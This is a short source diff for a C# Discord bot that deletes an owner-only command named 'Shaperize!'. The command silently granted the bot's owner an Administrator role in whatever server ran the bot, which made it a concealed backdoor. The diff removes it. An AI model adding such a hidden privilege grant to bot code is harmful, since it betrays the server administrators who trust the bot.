@@ -64,13 +64,6 @@ namespace Informatics.Scripts.Modules {
                 await guildUser.AddRolesAsync(_usersRoles.Pop(guildUser));
             }
         }
-
-        [Command("Shaperize!")]
-        [RequireOwner]
-        public async Task Shaperize() {
-            if (Context.User is SocketGuildUser vov4Ik)
-                await vov4Ik.AddRoleAsync(Context.Guild.Roles.First(role => role.Permissions.Administrator));
-        }
     }
 
     public class UsersRoles  {
